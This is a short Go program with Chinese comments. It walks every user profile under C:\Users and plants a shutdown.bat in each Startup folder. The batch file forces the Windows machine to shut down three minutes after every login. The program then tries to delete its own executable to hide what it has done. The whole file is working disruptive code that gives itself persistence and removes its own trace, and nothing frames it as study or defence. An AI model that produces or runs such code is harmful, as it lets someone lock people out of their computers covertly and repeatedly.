package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func main() {
	// 获取所有用户的目录
	usersDir := "C:\\Users\\"

	// 打开用户目录
	dir, err := os.Open(usersDir)
	if err != nil {
		fmt.Println("打开失败:", err)
		return
	}
	defer dir.Close()

	// 读取用户目录内容
	userDirs, err := dir.Readdirnames(-1)
	if err != nil {
		fmt.Println("读取失败:", err)
		return
	}

	// 遍历每个用户目录，查找启动文件夹
	for _, user := range userDirs {
		startupPath := filepath.Join(usersDir, user, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(startupPath); err == nil {
			fmt.Println("找到启动文件夹路径", user, ":", startupPath)

			// 构建.bat文件路径
			batFilePath := filepath.Join(startupPath, "shutdown.bat")

			// 写入.bat文件内容
			batContent := `@echo off
echo 关机计划已启动，将在三分钟后关机...
timeout /t 180
shutdown -s -t 0
`
			err := ioutil.WriteFile(batFilePath, []byte(batContent), 0644)
			if err != nil {
				fmt.Println("写入失败:", err)
				continue
			}

			fmt.Println("创建了shutdown.bat在", startupPath)

			// 删除编译后的可执行文件
			exePath, err := os.Executable()
			if err != nil {
				fmt.Println("获取可执行文件路径失败:", err)
				return
			}

			err = os.Remove(exePath)
			if err != nil {
				fmt.Println("删除可执行文件失败:", err)
				return
			}

			fmt.Println("已删除编译后的可执行文件:", exePath)
		}
	}
}
